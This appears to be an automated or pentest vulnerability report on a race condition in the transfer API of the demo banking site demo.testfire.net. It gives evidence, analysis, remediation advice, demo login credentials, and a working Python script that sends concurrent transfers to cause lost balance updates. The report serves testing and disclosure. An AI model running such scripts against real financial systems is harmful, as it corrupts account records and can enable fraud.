# Race condition (non-atomic balance read-modify-write) on POST /api/transfer causes lost updates despite HTTP 200 successes

**ID:** vuln-0016
**Severity:** MEDIUM
**Found:** 2026-09-20 21:49:02 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /api/transfer
**CWE:** CWE-362
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Medium

## Description

Fund transfers on `POST /api/transfer` are implemented as a non-atomic read-modify-write of account balances. When multiple transfers are submitted concurrently, they overwrite each other's balance updates, so many transfers that each return HTTP 200 "success" are silently lost. The number of applied transfers no longer matches the number of successful responses, producing an inconsistent ledger.

## Evidence

Controlled comparison on the same account pair (`800013` -> `800019`) and amount (`$1`), balances read via `GET /api/account/{no}`:

```text
SEQUENTIAL 30 transfers: 800013 54888882.99 -> 54888852.99 (delta -30.00)
                         800019 678886648.99 -> 678886678.99 (delta +30.00)   ok=30/30
CONCURRENT 30 transfers: 800013 54888851.99 -> 54888849.99 (delta  -2.00)
                         800019 678886679.99 -> 678886682.99 (delta  +3.00)   ok=30/30
CONCURRENT 60 transfers: applied ~3 of 60 (ok counter affected by client socket limits)
```

The 30 concurrent requests each received:

```http
HTTP/1.1 200 OK
{"success":"1.0 was successfully transferred from Account 800013 into Account 800019 ..."}
```

yet only ~2–4 units actually moved — the ledger reflects a fraction of the acknowledged transfers.

## Impact

Transfers acknowledged as successful are silently dropped, so account balances are inconsistent with their transaction history and with the responses returned to clients. A user or automated client that issues transfers under load (including retries) can end up with a ledger that does not reflect the actions reported as completed, undermining financial-record integrity and auditability. Under some interleavings the debit and credit sides diverge slightly, which in a real system would create small reconciliation discrepancies.

## Counterevidence

Argued the other side: could the reduced delta be a client/measurement artifact rather than a server-side lost update? Ruled out by the sequential-vs-concurrent contrast on the identical account pair and amount — 30 sequential requests applied exactly (-30/+30), while 30 concurrent requests with the same inputs applied only ~2-4, and every concurrent request returned HTTP 200 with a success message from the server. The delta was measured by re-reading balances through an independent endpoint after all requests completed, so it is not a read-timing artifact. No server-side locking, optimistic-concurrency (ETag/version) check, or serialization was observed; the same read-modify-write is the mechanism behind the separately confirmed self-transfer defect. Impact is limited to integrity/inconsistency (funds are not created for the attacker), which is why severity is moderate rather than high.

## What Would Change This Severity

If concurrency could be shown to create or destroy value asymmetrically for the attacker (rather than merely losing updates), severity would rise to high; confirming that balances are reconciled from a source of truth would lower it. The finding is currently rated on demonstrated ledger inconsistency only.

## Technical Analysis

The transfer handler reads the current balances of the source and destination accounts, computes new values in application memory, and writes them back. There is no row locking, no atomic `balance = balance +/- amount` update, and no optimistic-concurrency (version/ETag) check. When N requests run concurrently they all read the same pre-update balance and write back based on that stale snapshot, so the writes clobber one another: the final balance reflects only the last few writers even though every request returned success. This is the same non-atomic read-modify-write that also underlies the self-transfer funds-creation defect. The window is wide — no synchronization primitive or precise timing is needed; plain parallel requests reproduce it.

## Proof of Concept

1. Authenticate as `jsmith` via `POST /api/login` and capture the token.
2. Record the balances of two accounts (e.g. `800013` and `800019`).
3. Baseline: send 30 transfers of `$1` from `800013` to `800019` sequentially; each returns 200 and both balances move by exactly 30.
4. Re-baseline, then send the identical 30 transfers concurrently (e.g. with asyncio/aiohttp); all 30 return HTTP 200 success.
5. Re-read the balances: far fewer than 30 were applied (observed ~2–4), demonstrating the lost updates.
6. Repeat to confirm the delta is consistently far below the number of successful responses.

```python
import asyncio, json, re, aiohttp
from decimal import Decimal

BASE = "http://demo.testfire.net"
SRC, DST, AMT, N = "800013", "800019", "1", 30

login = None
async def main():
    global login
    async with aiohttp.ClientSession(trust_env=False) as s:
        login = (await (await s.post(BASE + "/api/login",
                    json={"username": "jsmith", "password": "demo1234"})).json())["Authorization"]
    H = {"Authorization": "Bearer " + login, "Content-Type": "application/json"}

    async def bal(s, a):
        t = await (await s.get(BASE + f"/api/account/{a}",
                    headers={"Authorization": "Bearer " + login})).text()
        return Decimal(re.search(r'"balance":"([^"]+)"', t).group(1).replace("$", "").replace(",", ""))

    async def xfer(s):
        body = json.dumps({"toAccount": DST, "fromAccount": SRC, "transferAmount": AMT})
        return (await s.post(BASE + "/api/transfer", headers=H, data=body)).status

    async with aiohttp.ClientSession(trust_env=False) as s:
        b_src, b_dst = await bal(s, SRC), await bal(s, DST)
        st = await asyncio.gather(*[xfer(s) for _ in range(N)])   # concurrent
        a_src, a_dst = await bal(s, SRC), await bal(s, DST)
        print("ok:", sum(1 for x in st if x == 200), "/", N)
        print("src delta:", a_src - b_src, " (expected -30)")
        print("dst delta:", a_dst - b_dst, " (expected +30)")

asyncio.run(main())
```

## Remediation

Make balance updates atomic and serialized. Perform each transfer in a single database transaction using atomic balance mutations (e.g. `UPDATE accounts SET balance = balance - ? WHERE account_id = ?` and `SET balance = balance + ?` inside one transaction) rather than read-compute-write, or apply row-level locking / `SELECT ... FOR UPDATE` on the affected rows for the duration of the transfer. Where optimistic concurrency is used, enforce a version/ETag check and retry on conflict so no acknowledged update is lost. Ensure the success response is only returned after the transaction commits.

## Assumptions

Assumes an authenticated user (jsmith/demo1234). The race requires only the ability to issue parallel requests — no special timing, privileged access, or victim interaction. No synchronization primitive is needed; ordinary concurrent HTTP requests reproduce it.
